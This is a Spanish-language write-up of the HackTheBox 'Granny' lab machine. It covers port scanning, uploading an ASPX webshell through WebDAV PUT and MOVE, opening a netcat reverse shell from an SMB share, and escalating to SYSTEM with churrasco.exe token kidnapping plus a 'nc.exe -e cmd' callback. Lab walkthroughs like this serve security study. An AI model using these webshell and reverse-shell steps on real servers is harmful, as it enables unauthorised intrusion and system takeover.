---
title: HackTheBox - Granny
author: cotes
date: 2023-09-14 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Windows, 'ISS Misconfiguration', 'Token Kidnapping Local Privilege Escalation (churrasco.exe)']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Granny/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Granny Machine Logo
---

Máquina Windows de nivel **Easy** de HackThBox.

Técnicas usadas: **ISS Misconfiguration, Token Kidnapping Local Privilege Escalation (churrasco.exe)**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Granny/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos abiertos

* **`nmap -p<Puertos> -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Granny/02-versions.png)

* Como en el servidor se pueden usar múltiples métodos. Usaremos **davtest** para conocer que tipos de ficheros podemos subir

    ```bash
    ❯ davtest -url http://<IP Optimum>
    /usr/bin/davtest Summary:
    Created: http://10.10.10.15/DavTestDir_gAlOic7ySMNmb_n
    PUT File: http://10.10.10.15/DavTestDir_gAlOic7ySMNmb_n/davtest_gAlOic7ySMNmb_n.jsp
    PUT File: http://10.10.10.15/DavTestDir_gAlOic7ySMNmb_n/davtest_gAlOic7ySMNmb_n.txt
    PUT File: http://10.10.10.15/DavTestDir_gAlOic7ySMNmb_n/davtest_gAlOic7ySMNmb_n.jhtml
    PUT File: http://10.10.10.15/DavTestDir_gAlOic7ySMNmb_n/davtest_gAlOic7ySMNmb_n.html
    PUT File: http://10.10.10.15/DavTestDir_gAlOic7ySMNmb_n/davtest_gAlOic7ySMNmb_n.php
    PUT File: http://10.10.10.15/DavTestDir_gAlOic7ySMNmb_n/davtest_gAlOic7ySMNmb_n.cfm
    PUT File: http://10.10.10.15/DavTestDir_gAlOic7ySMNmb_n/davtest_gAlOic7ySMNmb_n.pl
    Executes: http://10.10.10.15/DavTestDir_gAlOic7ySMNmb_n/davtest_gAlOic7ySMNmb_n.txt
    Executes: http://10.10.10.15/DavTestDir_gAlOic7ySMNmb_n/davtest_gAlOic7ySMNmb_n.html
    ```

    >  No podemos subir ficheros **.asp** o **.aspx**, pero, podemos subir un fichero con extensión acepta y moverlo para tratar de cambiarle la extensión
    {: .prompt-info }

* Subimos un fichero test.txt, pero, su contenido será una webshell aspx

    ```bash
    ❯ cp /usr/share/webshells/aspx/cmdasp.aspx test.txt
    ❯ curl -s -X PUT http://<IP Optimum>/test.txt -d @test.txt
    ❯ curl -s -X MOVE -H "Destination:http://<IP Optimum>/test.aspx" http://<IP Optimum>/test.txt
    ```

c. Ahora, ya podemos ejecutar comandos

![](/assets/images/HTB/Easy/Granny/03-rce.png)

* Nos entablaremos una reverse shell

    ```bash
    ❯ ls
    ❯ nc.exe
    ❯ impacket-smbserver Share ./ -smb2support
    ```

    ![](/assets/images/HTB/Easy/Granny/04-reverse.png)

    ```bash
    ❯ nc -lvnp 443
    connect to [10.10.14.18] from (UNKNOWN) [10.10.10.15] 1038
    Microsoft Windows [Version 5.2.3790]
    (C) Copyright 1985-2003 Microsoft Corp.

    c:\windows\system32\inetsrv>
    ```

### Escalada de Privilegios 💹

a. Investigamos un exploit en base a la información de `systeminfo`

```cmd
c:\windows\system32\inetsrv>systeminfo                                                                                                                                                        
                                                                                                                                                                                              
Host Name:   GRANNY                                                                                                                                                             
OS Name:     Microsoft(R) Windows(R) Server 2003, Standard Edition
```

* El sistema es vulnerable a [Token Kidnapping (churrasco.exe)](https://github.com/jivoi/pentest/blob/master/exploit_win/churrasco)

b. Pasamos el exploit a la máquina víctima y ejecutamos un comando para testear

```bash
❯ impacket-smbserver Share ./ -smb2support
-------------------------------------------------------------
C:\Temp>copy \\10.10.14.18\Share\churrasco.exe churrasco.exe
C:\Temp>.\churrasco.exe -d "whoami"
<SNIP>
nt authority\system
```

c. Nos entablaremos una reverse shell para tener una consola interactiva. 

```bash
❯ ls
❯ nc.exe
❯ impacket-smbserver Share ./ -smb2support
-------------------------------------------------------------
C:\Temp>.\churrasco.exe -d "\\<tun0 IP>\Share\nc.exe -e cmd <tun0 IP> 4445"

# Nos ponemos en escucha con nc
❯ nc -lvnp 4445
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
nt authority\system
```